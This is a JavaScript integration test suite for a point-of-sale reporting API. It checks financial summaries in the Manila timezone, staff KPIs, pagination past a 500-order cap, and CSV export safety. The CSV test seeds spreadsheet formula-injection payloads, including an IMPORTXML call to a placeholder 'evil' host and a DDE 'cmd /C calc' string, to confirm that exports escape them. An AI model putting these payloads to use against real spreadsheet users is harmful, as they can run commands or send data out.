import "./helpers/loadEnv.js";
import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import pool from "../api/src/database.js";
import { createCleanupTracker, makeUniqueTag, startTestServer } from "./helpers/testServer.js";

function parseCsvRows(csvText) {
  const withoutBom = csvText.startsWith("\uFEFF") ? csvText.slice(1) : csvText;
  const rows = [];
  let currentRow = [];
  let currentCell = "";
  let inQuotes = false;

  for (let i = 0; i < withoutBom.length; i += 1) {
    const ch = withoutBom[i];
    if (inQuotes) {
      if (ch === "\"") {
        if (withoutBom[i + 1] === "\"") {
          currentCell += "\"";
          i += 1;
        } else {
          inQuotes = false;
        }
      } else {
        currentCell += ch;
      }
    } else if (ch === "\"") {
      inQuotes = true;
    } else if (ch === ",") {
      currentRow.push(currentCell);
      currentCell = "";
    } else if (ch === "\r") {
      if (withoutBom[i + 1] === "\n") i += 1;
      currentRow.push(currentCell);
      rows.push(currentRow);
      currentRow = [];
      currentCell = "";
    } else if (ch === "\n") {
      currentRow.push(currentCell);
      rows.push(currentRow);
      currentRow = [];
      currentCell = "";
    } else {
      currentCell += ch;
    }
  }
  if (currentCell.length > 0 || currentRow.length > 0) {
    currentRow.push(currentCell);
    rows.push(currentRow);
  }
  return rows;
}

describe("Tala Suite: Reporting Analytics, Manila TZ, >500-Order Pagination & CSV Formula Protection", () => {
  let server;
  const tracker = createCleanupTracker();

  before(async () => {
    server = await startTestServer();
  });

  after(async () => {
    try {
      await tracker.cleanup();
    } finally {
      if (server) await server.close();
      await pool.end();
    }
  });

  it("GET /api/reports/financial-summary enforces Manila timezone boundaries, excludes Cancelled, handles rangeKey=all, counts uncosted items, and rejects from > to with 400", async () => {
    const tag = makeUniqueTag("Fin");
    const admin = await tracker.createUser({ role: "admin" });
    const staff = await tracker.createUser({ role: "staff" });

    // Validation: from > to -> 400, invalid rangeKey -> 400, malformed date -> 400
    const badOrder = await server.requestJson("/api/reports/financial-summary?from=2026-11-10&to=2026-11-01", { token: admin.token });
    assert.equal(badOrder.status, 400);
    assert.match(badOrder.data.message, /on or before/i);

    const badKey = await server.requestJson("/api/reports/financial-summary?rangeKey=quarter", { token: admin.token });
    assert.equal(badKey.status, 400);

    const badDate = await server.requestJson("/api/reports/financial-summary?from=2026-99-99", { token: admin.token });
    assert.equal(badDate.status, 400);

    // Manila today check
    const expectedManilaToday = new Intl.DateTimeFormat("en-CA", {
      timeZone: "Asia/Manila",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
    }).format(new Date());
    const todayRes = await server.requestJson("/api/reports/financial-summary?rangeKey=today", { token: admin.token });
    assert.equal(todayRes.status, 200);
    assert.equal(todayRes.data.range.from, expectedManilaToday);
    assert.equal(todayRes.data.range.to, expectedManilaToday);

    // rangeKey=all sets previousSummary: null and deltas: null
    const allRes = await server.requestJson("/api/reports/financial-summary?rangeKey=all", { token: admin.token });
    assert.equal(allRes.status, 200);
    assert.equal(allRes.data.range.rangeKey, "all");
    assert.equal(allRes.data.range.from, null);
    assert.equal(allRes.data.range.to, null);
    assert.equal(allRes.data.previousSummary, null);
    assert.equal(allRes.data.deltas, null);

    // Isolated historical date window (2021-06-14 & 2021-06-15) with zero live store orders
    const [mCat] = await pool.execute(
      "INSERT INTO menu_categories (name, operational_family) VALUES (?, 'single_fixed')",
      [`FinCat_${tag}`],
    );
    tracker.menuCategoryIds.add(Number(mCat.insertId));

    const [pCosted] = await pool.execute(
      "INSERT INTO menu_products (category_id, name, base_price, cost_price, stock_quantity) VALUES (?, ?, 100.00, 30.00, 50)",
      [mCat.insertId, `FinCosted_${tag}`],
    );
    const costedProdId = Number(pCosted.insertId);
    tracker.productIds.add(costedProdId);

    const [pUncosted] = await pool.execute(
      "INSERT INTO menu_products (category_id, name, base_price, cost_price, stock_quantity) VALUES (?, ?, 12.50, 0.00, 50)",
      [mCat.insertId, `FinUncosted_${tag}`],
    );
    const uncostedProdId = Number(pUncosted.insertId);
    tracker.productIds.add(uncostedProdId);

    const [invRes] = await pool.execute(
      "INSERT INTO inventory_items (name, category, quantity, unit, unit_cost) VALUES (?, 'Ingredients', 100, 'pcs', 30.000000)",
      [`FinInv_${tag}`],
    );
    const invId = Number(invRes.insertId);
    tracker.inventoryItemIds.add(invId);

    // Order in previous period: 2021-06-14 23:59:58 Manila (total 100, cost 30)
    const [prevOrder] = await pool.execute(
      `INSERT INTO orders (
         order_number, customer_name, order_type, order_status, payment_status, payment_method,
         subtotal, total, created_by, cashier_name, paid_at, created_at
       ) VALUES (?, 'Prev Day Customer', 'Counter', 'Completed', 'Paid', 'Cash', 100.00, 100.00, ?, ?, '2021-06-14 23:59:58', '2021-06-14 23:59:58')`,
      [`AM-TALA-PREV-${tag}`.slice(0, 32), staff.id, staff.displayName],
    );
    tracker.orderIds.add(Number(prevOrder.insertId));
    await pool.execute(
      `INSERT INTO order_items (order_id, product_id, product_name_snapshot, category_name_snapshot, quantity, size_label, unit_price, unit_cost_snapshot)
       VALUES (?, ?, ?, ?, 1, 'Regular', 100.00, 30.0000)`,
      [prevOrder.insertId, costedProdId, `FinCosted_${tag}`, `FinCat_${tag}`],
    );

    // Order 1 in target period: inserted via UTC 2021-06-14 16:30:00 -> Manila 2021-06-15 00:30:00!
    // Total = 2*100 + 4*12.50 = 250.00; costed = 2*30 = 60.00; uncosted units = 4
    const o1No = `AM-TALA-D1-${tag}`.slice(0, 32);
    const [curPaid] = await pool.execute(
      `INSERT INTO orders (
         order_number, customer_name, order_type, order_status, payment_status, payment_method,
         subtotal, total, created_by, cashier_name, paid_at, created_at
       ) VALUES (?, 'Manila Boundary Customer', 'Takeout', 'Completed', 'Paid', 'GCash', 250.00, 250.00, ?, ?,
                 CONVERT_TZ('2021-06-14 16:30:00', '+00:00', '+08:00'),
                 CONVERT_TZ('2021-06-14 16:30:00', '+00:00', '+08:00'))`,
      [o1No, staff.id, staff.displayName],
    );
    tracker.orderIds.add(Number(curPaid.insertId));
    const [curCostedItem] = await pool.execute(
      `INSERT INTO order_items (order_id, product_id, product_name_snapshot, category_name_snapshot, quantity, size_label, unit_price, unit_cost_snapshot)
       VALUES (?, ?, ?, ?, 2, 'Regular', 100.00, 30.0000)`,
      [curPaid.insertId, costedProdId, `FinCosted_${tag}`, `FinCat_${tag}`],
    );
    await pool.execute(
      `INSERT INTO order_inventory_consumptions
         (order_id, order_item_id, order_number, product_name_snapshot, inventory_item_id, inventory_item_name_snapshot, quantity_used, unit, unit_cost_snapshot, line_cost, source)
       VALUES (?, ?, ?, ?, ?, ?, 2, 'pcs', 30.000000, 60.0000, 'recipe')`,
      [curPaid.insertId, curCostedItem.insertId, o1No, `FinCosted_${tag}`, invId, `FinInv_${tag}`],
    );
    await pool.execute(
      `INSERT INTO order_items (order_id, product_id, product_name_snapshot, category_name_snapshot, quantity, size_label, unit_price, unit_cost_snapshot)
       VALUES (?, ?, ?, ?, 4, 'Regular', 12.50, NULL)`,
      [curPaid.insertId, uncostedProdId, `FinUncosted_${tag}`, `FinCat_${tag}`],
    );

    // Order 2 in target period: Cancelled (voided) paid order (total 500, cost 150) -> MUST be excluded from sales/COGS/profit
    const [curCancelled] = await pool.execute(
      `INSERT INTO orders (
         order_number, customer_name, order_type, order_status, payment_status, payment_method,
         subtotal, total, created_by, cashier_name, voided_by, voided_at, void_reason, created_at
       ) VALUES (?, 'Voided Customer', 'Counter', 'Cancelled', 'Paid', 'Cash', 500.00, 500.00, ?, ?, ?, '2021-06-15 12:00:00', 'Cancelled test order', '2021-06-15 11:00:00')`,
      [`AM-TALA-CANC-${tag}`.slice(0, 32), staff.id, staff.displayName, admin.id],
    );
    tracker.orderIds.add(Number(curCancelled.insertId));
    await pool.execute(
      `INSERT INTO order_items (order_id, product_id, product_name_snapshot, category_name_snapshot, quantity, size_label, unit_price, unit_cost_snapshot)
       VALUES (?, ?, ?, ?, 5, 'Regular', 100.00, 30.0000)`,
      [curCancelled.insertId, costedProdId, `FinCosted_${tag}`, `FinCat_${tag}`],
    );

    // Order 3 in target period: Unpaid pending order (total 99) -> excluded from grossCollectedSales
    const [curUnpaid] = await pool.execute(
      `INSERT INTO orders (
         order_number, customer_name, order_type, order_status, payment_status, payment_method,
         subtotal, total, created_by, cashier_name, created_at
       ) VALUES (?, 'Unpaid Customer', 'Dine-in', 'Pending', 'Unpaid', NULL, 99.00, 99.00, ?, ?, '2021-06-15 15:00:00')`,
      [`AM-TALA-UNP-${tag}`.slice(0, 32), staff.id, staff.displayName],
    );
    tracker.orderIds.add(Number(curUnpaid.insertId));

    // Restock movement in target period (batch_cost = 180.50)
    await pool.execute(
      `INSERT INTO inventory_movements (
         inventory_item_id, user_id, movement_type, quantity_change, note,
         item_name_snapshot, actor_name_snapshot, before_quantity, after_quantity, unit, batch_cost, created_at
       ) VALUES (?, ?, 'restock', 10, 'Test expenditure', ?, ?, 90, 100, 'pcs', 180.50, '2021-06-15 09:00:00')`,
      [invId, admin.id, `FinInv_${tag}`, admin.displayName],
    );

    const res = await server.requestJson("/api/reports/financial-summary?from=2021-06-15&to=2021-06-15", {
      token: admin.token,
    });
    assert.equal(res.status, 200);
    assert.equal(res.data.range.previousFrom, "2021-06-14");
    assert.equal(res.data.range.previousTo, "2021-06-14");

    // Current summary excludes Cancelled and Unpaid from sales/COGS/profit
    assert.equal(res.data.summary.grossCollectedSales, 250);
    assert.equal(res.data.summary.cogs, 60);
    assert.equal(res.data.summary.grossProfit, 190);
    assert.equal(res.data.summary.marginPercent, 76);
    assert.equal(res.data.summary.paidOrdersCount, 1);
    assert.equal(res.data.summary.unpaidOrdersCount, 1);
    assert.equal(res.data.summary.voidedOrdersCount, 1);
    assert.equal(res.data.summary.voidedSalesTotal, 500);
    assert.equal(res.data.summary.unitsSold, 6);
    assert.equal(res.data.summary.uncostedItemsCount, 4);
    assert.equal(res.data.summary.uncostedLineCount, 1);
    assert.equal(res.data.summary.gcashCollected, 250);
    assert.equal(res.data.summary.cashCollected, 0);
    assert.equal(res.data.summary.inventoryExpenditure, 180.5);
    assert.equal(res.data.summary.inventoryRestockCount, 1);

    // Previous summary captures the 2021-06-14 order
    assert.equal(res.data.previousSummary.grossCollectedSales, 100);
    assert.equal(res.data.previousSummary.cogs, 30);
    assert.equal(res.data.previousSummary.grossProfit, 70);
    assert.equal(res.data.deltas.grossCollectedSales.change, 150);
    assert.equal(res.data.deltas.grossCollectedSales.percent, 150);

    // Daily series verifies Manila date bucket '2021-06-15' (converted from 2021-06-14 16:30 UTC)
    assert.equal(res.data.series.length, 1);
    assert.equal(res.data.series[0].date, "2021-06-15");
    assert.equal(res.data.series[0].sales, 250);
    assert.equal(res.data.series[0].cogs, 60);
    assert.equal(res.data.series[0].profit, 190);
  });

  it("GET /api/reports/staff-performance includes full staff roster (active, inactive, zero-sale) and accurate KPIs", async () => {
    const tag = makeUniqueTag("StaffPerf");
    const admin = await tracker.createUser({ role: "admin" });
    const seller = await tracker.createUser({ role: "staff", displayName: `Seller ${tag}`, isActive: true });
    const zeroSaleActive = await tracker.createUser({ role: "staff", displayName: `ZeroSale ${tag}`, isActive: true });
    const inactiveCashier = await tracker.createUser({ role: "staff", displayName: `Inactive ${tag}`, isActive: false });

    const [invRes] = await pool.execute(
      "INSERT INTO inventory_items (name, category, quantity, unit, unit_cost) VALUES (?, 'Ingredients', 100, 'pcs', 10.000000)",
      [`PerfInv_${tag}`],
    );
    const invId = Number(invRes.insertId);
    tracker.inventoryItemIds.add(invId);

    const [mCat] = await pool.execute(
      "INSERT INTO menu_categories (name, operational_family) VALUES (?, 'single_fixed')",
      [`PerfCat_${tag}`],
    );
    tracker.menuCategoryIds.add(Number(mCat.insertId));

    const [pRes] = await pool.execute(
      "INSERT INTO menu_products (category_id, name, base_price, cost_price, stock_quantity) VALUES (?, ?, 100.00, 40.00, 50)",
      [mCat.insertId, `PerfProd_${tag}`],
    );
    const prodId = Number(pRes.insertId);
    tracker.productIds.add(prodId);

    // 2 paid orders for seller on 2021-06-16 (totals: 200 and 100 -> grossSales=300, cogs=120, profit=180, avgTicket=150)
    const [o1] = await pool.execute(
      `INSERT INTO orders (
         order_number, customer_name, order_type, order_status, payment_status, payment_method,
         subtotal, total, created_by, cashier_name, paid_at, created_at
       ) VALUES (?, 'C1', 'Counter', 'Completed', 'Paid', 'Cash', 200.00, 200.00, ?, ?, '2021-06-16 10:00:00', '2021-06-16 10:00:00')`,
      [`AM-PERF1-${tag}`.slice(0, 32), seller.id, seller.displayName],
    );
    tracker.orderIds.add(Number(o1.insertId));
    await pool.execute(
      `INSERT INTO order_items (order_id, product_id, product_name_snapshot, category_name_snapshot, quantity, size_label, unit_price, unit_cost_snapshot)
       VALUES (?, ?, ?, ?, 2, 'Regular', 100.00, 40.0000)`,
      [o1.insertId, prodId, `PerfProd_${tag}`, `PerfCat_${tag}`],
    );

    const [o2] = await pool.execute(
      `INSERT INTO orders (
         order_number, customer_name, order_type, order_status, payment_status, payment_method,
         subtotal, total, created_by, cashier_name, paid_at, created_at
       ) VALUES (?, 'C2', 'Takeout', 'Completed', 'Paid', 'GCash', 100.00, 100.00, ?, ?, '2021-06-16 11:00:00', '2021-06-16 11:00:00')`,
      [`AM-PERF2-${tag}`.slice(0, 32), seller.id, seller.displayName],
    );
    tracker.orderIds.add(Number(o2.insertId));
    await pool.execute(
      `INSERT INTO order_items (order_id, product_id, product_name_snapshot, category_name_snapshot, quantity, size_label, unit_price, unit_cost_snapshot)
       VALUES (?, ?, ?, ?, 1, 'Regular', 100.00, 40.0000)`,
      [o2.insertId, prodId, `PerfProd_${tag}`, `PerfCat_${tag}`],
    );

    // 1 cashier session and 2 inventory movements on 2021-06-16 for seller
    const [sess] = await pool.execute(
      `INSERT INTO cashier_sessions (user_id, cashier_name_snapshot, terminal_label, opened_at, closed_at, status, opening_float, expected_cash, counted_cash, variance)
       VALUES (?, ?, 'Counter 1', '2021-06-16 09:00:00', '2021-06-16 18:00:00', 'closed', 1000, 1200, 1200, 0)`,
      [seller.id, seller.displayName],
    );
    tracker.sessionIds.add(Number(sess.insertId));

    await pool.execute(
      `INSERT INTO inventory_movements (
         inventory_item_id, user_id, movement_type, quantity_change, note,
         item_name_snapshot, actor_name_snapshot, before_quantity, after_quantity, unit, session_id, created_at
       ) VALUES
         (?, ?, 'usage', -2, 'Perf usage 1', ?, ?, 100, 98, 'pcs', ?, '2021-06-16 10:00:00'),
         (?, ?, 'usage', -1, 'Perf usage 2', ?, ?, 98, 97, 'pcs', ?, '2021-06-16 11:00:00')`,
      [
        invId, seller.id, `PerfInv_${tag}`, seller.displayName, sess.insertId,
        invId, seller.id, `PerfInv_${tag}`, seller.displayName, sess.insertId,
      ],
    );

    const res = await server.requestJson("/api/reports/staff-performance?from=2021-06-16&to=2021-06-16", {
      token: admin.token,
    });
    assert.equal(res.status, 200);
    assert.match(res.data.kpiNote, /does not represent staff wages/i);

    const sellerRow = res.data.staff.find((s) => s.userId === seller.id);
    const zeroRow = res.data.staff.find((s) => s.userId === zeroSaleActive.id);
    const inactiveRow = res.data.staff.find((s) => s.userId === inactiveCashier.id);

    assert.ok(sellerRow, "Active selling cashier must be included");
    assert.ok(zeroRow, "Zero-sale active cashier must be included in roster");
    assert.ok(inactiveRow, "Inactive cashier must be included in roster");

    assert.equal(sellerRow.ordersCount, 2);
    assert.equal(sellerRow.unitsSold, 3);
    assert.equal(sellerRow.grossSales, 300);
    assert.equal(sellerRow.cogs, 120);
    assert.equal(sellerRow.attributedGrossProfit, 180);
    assert.equal(sellerRow.averageTicket, 150);
    assert.equal(sellerRow.inventoryActionsCount, 2);
    assert.equal(sellerRow.sessionsCount, 1);

    assert.equal(zeroRow.isActive, true);
    assert.equal(zeroRow.ordersCount, 0);
    assert.equal(zeroRow.grossSales, 0);
    assert.equal(zeroRow.attributedGrossProfit, 0);
    assert.equal(zeroRow.averageTicket, 0);

    assert.equal(inactiveRow.isActive, false);
    assert.equal(inactiveRow.ordersCount, 0);

    // isActive=inactive filter check
    const inactiveOnly = await server.requestJson("/api/reports/staff-performance?from=2021-06-16&to=2021-06-16&isActive=inactive", {
      token: admin.token,
    });
    assert.equal(inactiveOnly.status, 200);
    assert.ok(inactiveOnly.data.staff.some((s) => s.userId === inactiveCashier.id));
    assert.equal(inactiveOnly.data.staff.some((s) => s.userId === zeroSaleActive.id), false);
  });

  it("GET /api/reports/staff/:id/activity aggregates and paginates beyond the 500-order cap with full breakdowns", async () => {
    const tag = makeUniqueTag("Over500");
    const admin = await tracker.createUser({ role: "admin" });
    const highVolStaff = await tracker.createUser({ role: "staff", displayName: `HighVol ${tag}` });

    const [mCat] = await pool.execute(
      "INSERT INTO menu_categories (name, operational_family) VALUES (?, 'single_fixed')",
      [`HV_Cat_${tag}`],
    );
    tracker.menuCategoryIds.add(Number(mCat.insertId));

    const [pRes] = await pool.execute(
      "INSERT INTO menu_products (category_id, name, base_price, cost_price, stock_quantity) VALUES (?, ?, 12.00, 5.00, 1000)",
      [mCat.insertId, `HV_Item_${tag}`],
    );
    const prodId = Number(pRes.insertId);
    tracker.productIds.add(prodId);

    const [invRes] = await pool.execute(
      "INSERT INTO inventory_items (name, category, quantity, unit, unit_cost) VALUES (?, 'Ingredients', 100, 'pcs', 2.000000)",
      [`HV_Inv_${tag}`],
    );
    const invId = Number(invRes.insertId);
    tracker.inventoryItemIds.add(invId);

    // 1 session on 2021-06-17
    const [sess] = await pool.execute(
      `INSERT INTO cashier_sessions (user_id, cashier_name_snapshot, terminal_label, opened_at, status, opening_float)
       VALUES (?, ?, 'HV Counter', '2021-06-17 08:00:00', 'open', 500.00)`,
      [highVolStaff.id, highVolStaff.displayName],
    );
    tracker.sessionIds.add(Number(sess.insertId));

    // Bulk insert 505 Paid orders + 1 Cancelled order (total 506 orders > 500 cap!)
    const totalPaidOrders = 505;
    const orderValues = [];
    const orderPlaceholders = [];
    for (let i = 1; i <= totalPaidOrders; i += 1) {
      const mm = String(Math.floor((i - 1) / 60)).padStart(2, "0");
      const ss = String((i - 1) % 60).padStart(2, "0");
      const ts = `2021-06-17 10:${mm}:${ss}`;
      const payMethod = i % 2 === 0 ? "GCash" : "Cash";
      const oType = i % 3 === 0 ? "Dine-in" : "Takeout";
      orderPlaceholders.push("(?, ?, ?, 'Completed', 'Paid', ?, 12.00, 12.00, ?, ?, ?, ?, ?)");
      orderValues.push(
        `AM-HV-${String(i).padStart(3, "0")}-${tag}`.slice(0, 32),
        `HV Cust ${i}`,
        oType,
        payMethod,
        highVolStaff.id,
        highVolStaff.displayName,
        sess.insertId,
        ts,
        ts,
      );
    }
    const [bulkOrdRes] = await pool.execute(
      `INSERT INTO orders (
         order_number, customer_name, order_type, order_status, payment_status, payment_method,
         subtotal, total, created_by, cashier_name, session_id, paid_at, created_at
       ) VALUES ${orderPlaceholders.join(",")}`,
      orderValues,
    );
    const firstOrderId = Number(bulkOrdRes.insertId);
    for (let i = 0; i < totalPaidOrders; i += 1) {
      tracker.orderIds.add(firstOrderId + i);
    }

    // Bulk insert matching 505 order_items & 505 order_status_events
    const itemPlaceholders = [];
    const itemValues = [];
    const evtPlaceholders = [];
    const evtValues = [];
    for (let i = 0; i < totalPaidOrders; i += 1) {
      const oid = firstOrderId + i;
      itemPlaceholders.push("(?, ?, ?, ?, 1, 'Regular', 12.00, 5.0000)");
      itemValues.push(oid, prodId, `HV_Item_${tag}`, `HV_Cat_${tag}`);
      evtPlaceholders.push("(?, 'Preparing', 'Completed', ?, ?, '2021-06-17 10:59:00')");
      evtValues.push(oid, highVolStaff.id, highVolStaff.displayName);
    }
    await pool.execute(
      `INSERT INTO order_items (order_id, product_id, product_name_snapshot, category_name_snapshot, quantity, size_label, unit_price, unit_cost_snapshot)
       VALUES ${itemPlaceholders.join(",")}`,
      itemValues,
    );
    await pool.execute(
      `INSERT INTO order_status_events (order_id, from_status, to_status, changed_by, actor_name_snapshot, created_at)
       VALUES ${evtPlaceholders.join(",")}`,
      evtValues,
    );

    // Add 1 voided order (506th order)
    const [voidOrd] = await pool.execute(
      `INSERT INTO orders (
         order_number, customer_name, order_type, order_status, payment_status, payment_method,
         subtotal, total, created_by, cashier_name, session_id, voided_by, voided_at, void_reason, created_at
       ) VALUES (?, 'HV Voided', 'Counter', 'Cancelled', 'Paid', 'Cash', 12.00, 12.00, ?, ?, ?, ?, '2021-06-17 12:00:00', 'HV test void', '2021-06-17 11:30:00')`,
      [`AM-HVV-${tag}`.slice(0, 32), highVolStaff.id, highVolStaff.displayName, sess.insertId, admin.id],
    );
    tracker.orderIds.add(Number(voidOrd.insertId));

    // Add 2 inventory movements
    await pool.execute(
      `INSERT INTO inventory_movements (
         inventory_item_id, user_id, movement_type, quantity_change, note,
         item_name_snapshot, actor_name_snapshot, before_quantity, after_quantity, unit, session_id, created_at
       ) VALUES
         (?, ?, 'adjustment', -1, 'HV adj 1', ?, ?, 100, 99, 'pcs', ?, '2021-06-17 09:00:00'),
         (?, ?, 'adjustment', 1, 'HV adj 2', ?, ?, 99, 100, 'pcs', ?, '2021-06-17 09:05:00')`,
      [
        invId, highVolStaff.id, `HV_Inv_${tag}`, highVolStaff.displayName, sess.insertId,
        invId, highVolStaff.id, `HV_Inv_${tag}`, highVolStaff.displayName, sess.insertId,
      ],
    );

    const page1 = await server.requestJson(
      `/api/reports/staff/${highVolStaff.id}/activity?from=2021-06-17&to=2021-06-17&page=1&limit=25`,
      { token: admin.token },
    );
    assert.equal(page1.status, 200);
    assert.equal(page1.data.summary.paidOrdersCount, 505, "Must aggregate all 505 paid orders beyond 500 cap");
    assert.equal(page1.data.summary.voidedOrdersCount, 1);
    assert.equal(page1.data.summary.grossCollectedSales, 6060);
    assert.equal(page1.data.summary.cogs, 2525);
    assert.equal(page1.data.summary.attributedGrossProfit, 3535);
    assert.equal(page1.data.summary.unitsSold, 505);
    assert.equal(page1.data.orders.total, 506);
    assert.equal(page1.data.orders.items.length, 25);
    assert.equal(page1.data.productBreakdown[0].unitsSold, 505);
    assert.equal(page1.data.sessions.length, 1);
    assert.equal(page1.data.inventoryActivity.length, 2);
    assert.ok(page1.data.stageActions.length > 0);

    // Page 21 with limit=25 retrieves the 6 tail orders past index 500!
    const page21 = await server.requestJson(
      `/api/reports/staff/${highVolStaff.id}/activity?from=2021-06-17&to=2021-06-17&page=21&limit=25`,
      { token: admin.token },
    );
    assert.equal(page21.status, 200);
    assert.equal(page21.data.orders.items.length, 6, "Page 21 must return the remaining 6 orders past index 500");

    // Filtered query check (paymentMethod=GCash -> 252 even-numbered orders)
    const gcashFiltered = await server.requestJson(
      `/api/reports/staff/${highVolStaff.id}/activity?from=2021-06-17&to=2021-06-17&paymentMethod=GCash`,
      { token: admin.token },
    );
    assert.equal(gcashFiltered.status, 200);
    assert.equal(gcashFiltered.data.summary.paidOrdersCount, 252);
    assert.equal(gcashFiltered.data.orders.total, 252);
  });

  it("GET /api/reports/inventory-activity and GET /api/reports/export.csv neutralize formula injection and emit UTF-8 BOM", async () => {
    const tag = makeUniqueTag("Csv");
    const admin = await tracker.createUser({ role: "admin" });
    const staff = await tracker.createUser({ role: "staff" });

    // Create inventory item with leading '@' and movements with formula-injection supplier/ref
    const [invRes] = await pool.execute(
      "INSERT INTO inventory_items (name, category, quantity, unit, unit_cost) VALUES (?, 'Ingredients', 50, 'pcs', 5.000000)",
      [`@MaliciousItem_${tag}`],
    );
    const invId = Number(invRes.insertId);
    tracker.inventoryItemIds.add(invId);

    await pool.execute(
      `INSERT INTO inventory_movements (
         inventory_item_id, user_id, movement_type, quantity_change, note,
         item_name_snapshot, actor_name_snapshot, before_quantity, after_quantity, unit,
         batch_cost, supplier_name, reference_no, created_at
       ) VALUES
         (?, ?, 'restock', 10, 'Restock test', ?, ?, 40, 50, 'pcs', 250.00, '=IMPORTXML("http://evil")', '+REF1', '2021-06-18 09:00:00'),
         (?, ?, 'adjustment', -2, 'Adj test', ?, ?, 50, 48, 'pcs', NULL, NULL, '-REF2', '2021-06-18 09:10:00'),
         (?, ?, 'spoilage', 0, 'Spoil test', ?, ?, 48, 48, 'pcs', NULL, NULL, NULL, '2021-06-18 09:20:00'),
         (?, ?, 'void_restore', 2, 'Restore test', ?, ?, 48, 50, 'pcs', NULL, NULL, NULL, '2021-06-18 09:30:00')`,
      [
        invId, admin.id, `@MaliciousItem_${tag}`, admin.displayName,
        invId, admin.id, `@MaliciousItem_${tag}`, admin.displayName,
        invId, admin.id, `@MaliciousItem_${tag}`, admin.displayName,
        invId, admin.id, `@MaliciousItem_${tag}`, admin.displayName,
      ],
    );

    // Create orders on 2021-06-18 with formula-injection payloads starting with =, +, -, @
    const [ordRes] = await pool.execute(
      `INSERT INTO orders (
         order_number, customer_name, notes, order_type, order_status, payment_status, payment_method,
         subtotal, total, created_by, cashier_name, paid_at, created_at
       ) VALUES
         (?, '=SUM(A1:A2)', '+cmd|'' /C calc''!A0', 'Counter', 'Completed', 'Paid', 'Cash', 50.00, 50.00, ?, ?, '2021-06-18 10:00:00', '2021-06-18 10:00:00'),
         (?, '@EVIL_USER', '-1+1', 'Takeout', 'Completed', 'Paid', 'GCash', 30.00, 30.00, ?, ?, '2021-06-18 11:00:00', '2021-06-18 11:00:00')`,
      [
        `AM-CSV1-${tag}`.slice(0, 32), staff.id, staff.displayName,
        `AM-CSV2-${tag}`.slice(0, 32), staff.id, staff.displayName,
      ],
    );
    const o1Id = Number(ordRes.insertId);
    tracker.orderIds.add(o1Id);
    tracker.orderIds.add(o1Id + 1);

    // 1. Verify /api/reports/inventory-activity
    const invAct = await server.requestJson(
      `/api/reports/inventory-activity?from=2021-06-18&to=2021-06-18&itemId=${invId}`,
      { token: admin.token },
    );
    assert.equal(invAct.status, 200);
    assert.equal(invAct.data.summary.totalMovements, 4);
    assert.equal(invAct.data.summary.totalRestockCost, 250);
    assert.equal(invAct.data.summary.totalRestockCount, 1);
    assert.equal(invAct.data.summary.totalAdjustmentCount, 1);
    assert.equal(invAct.data.summary.totalSpoilageCount, 1);
    assert.equal(invAct.data.summary.totalVoidRestoreCount, 1);
    assert.equal(invAct.data.items.length, 4);

    // 2. Verify /api/reports/export.csv?type=orders UTF-8 BOM & formula escaping
    const ordersCsv = await server.requestRaw(
      "/api/reports/export.csv?type=orders&from=2021-06-18&to=2021-06-18",
      { token: admin.token },
    );
    assert.equal(ordersCsv.status, 200);
    assert.match(ordersCsv.headers.get("content-type") || "", /text\/csv/i);
    assert.match(ordersCsv.headers.get("content-disposition") || "", /amaya-orders-report-/i);
    assert.equal(ordersCsv.buffer[0], 0xef);
    assert.equal(ordersCsv.buffer[1], 0xbb);
    assert.equal(ordersCsv.buffer[2], 0xbf);
    assert.equal(ordersCsv.text.startsWith("\uFEFF"), true);

    const parsedOrderRows = parseCsvRows(ordersCsv.text);
    const allOrderCells = parsedOrderRows.slice(1).flat();
    assert.ok(allOrderCells.includes("'=SUM(A1:A2)"), "Leading '=' must be apostrophe-escaped");
    assert.ok(allOrderCells.includes("'+cmd|' /C calc'!A0"), "Leading '+' must be apostrophe-escaped");
    assert.ok(allOrderCells.includes("'@EVIL_USER"), "Leading '@' must be apostrophe-escaped");
    assert.ok(allOrderCells.includes("'-1+1"), "Leading '-' must be apostrophe-escaped");

    // Verify no cell in orders export starts unescaped with =, +, -, or @
    for (const row of parsedOrderRows.slice(1)) {
      for (const cell of row) {
        assert.equal(/^[=+\-@]/.test(cell), false, `Unsafe unescaped CSV cell found: ${cell}`);
      }
    }

    // 3. Verify /api/reports/export.csv?type=staff & type=products formula escaping + BOM
    const formulaStaff = await tracker.createUser({ role: "staff", displayName: `=StaffFormula_${tag}` });
    const [mCat] = await pool.execute(
      "INSERT INTO menu_categories (name, operational_family) VALUES (?, 'single_fixed')",
      [`CsvCat_${tag}`],
    );
    tracker.menuCategoryIds.add(Number(mCat.insertId));
    const [pRes] = await pool.execute(
      "INSERT INTO menu_products (category_id, name, base_price, cost_price, stock_quantity) VALUES (?, ?, 40.00, 15.00, 10)",
      [mCat.insertId, `+ProdFormula_${tag}`],
    );
    const prodId = Number(pRes.insertId);
    tracker.productIds.add(prodId);

    const [fOrd] = await pool.execute(
      `INSERT INTO orders (
         order_number, customer_name, order_type, order_status, payment_status, payment_method,
         subtotal, total, created_by, cashier_name, paid_at, created_at
       ) VALUES (?, 'Formula Safe', 'Counter', 'Completed', 'Paid', 'Cash', 40.00, 40.00, ?, ?, '2021-06-18 12:00:00', '2021-06-18 12:00:00')`,
      [`AM-CSV3-${tag}`.slice(0, 32), formulaStaff.id, formulaStaff.displayName],
    );
    tracker.orderIds.add(Number(fOrd.insertId));
    await pool.execute(
      `INSERT INTO order_items (order_id, product_id, product_name_snapshot, category_name_snapshot, quantity, size_label, unit_price, unit_cost_snapshot)
       VALUES (?, ?, ?, ?, 1, 'Regular', 40.00, 15.0000)`,
      [fOrd.insertId, prodId, `+ProdFormula_${tag}`, `CsvCat_${tag}`],
    );

    const staffCsv = await server.requestRaw(
      "/api/reports/export.csv?type=staff&from=2021-06-18&to=2021-06-18",
      { token: admin.token },
    );
    assert.equal(staffCsv.status, 200);
    assert.equal(staffCsv.text.startsWith("\uFEFF"), true);
    const allStaffCells = parseCsvRows(staffCsv.text).slice(1).flat();
    assert.ok(allStaffCells.includes(`'=StaffFormula_${tag}`), "Staff displayName starting with '=' must be apostrophe-escaped");

    const productsCsv = await server.requestRaw(
      "/api/reports/export.csv?type=products&from=2021-06-18&to=2021-06-18",
      { token: admin.token },
    );
    assert.equal(productsCsv.status, 200);
    assert.equal(productsCsv.text.startsWith("\uFEFF"), true);
    const allProdCells = parseCsvRows(productsCsv.text).slice(1).flat();
    assert.ok(allProdCells.includes(`'+ProdFormula_${tag}`), "Product name starting with '+' must be apostrophe-escaped");

    // 4. Reject invalid export type
